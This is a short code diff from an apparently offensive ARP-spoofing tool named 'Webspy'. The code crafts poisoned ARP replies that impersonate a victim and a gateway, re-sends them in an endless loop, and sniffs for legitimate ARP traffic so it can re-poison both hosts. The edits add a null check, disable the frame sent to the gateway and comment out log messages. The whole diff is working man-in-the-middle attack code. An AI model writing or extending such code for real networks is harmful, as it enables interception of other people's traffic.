@@ -35,6 +35,10 @@ void* Spoofer::spoof(void* args){
 
 	// Poisoned frame to gateway
 	Crafter toGateway(Globals::iface);
+	if(!Globals::gateway.mac){
+		fprintf(stderr, "Webspy::Spoofer::spoof > [ERRO] gateway's mac is NULL\n");
+		exit(EXIT_FAILURE);
+	}
 	toGateway.arp(
 		ARPOP_REPLY,
 		Globals::attacker.mac->ether_addr_octet, Globals::victim.ip,
@@ -53,7 +57,7 @@ void* Spoofer::spoof(void* args){
 	do{
 		// Spoofando de novo
 		toVictim.send();
-		toGateway.send();
+		//toGateway.send();
 
 		sniffer.listen(spoofBack);
 	} while(true);
@@ -78,7 +82,7 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 		if(htons(arp.arpOp) == ARPOP_REPLY){
 			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
 			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
-				printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
+				// printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
 				pcap_breakloop(pcapContext);
 			}
 
@@ -86,7 +90,7 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 		} else if (htons(arp.arpOp) == ARPOP_REQUEST){
 			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
 			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
-				printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
+				// printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
 				pcap_breakloop(pcapContext);
 			}
 		}
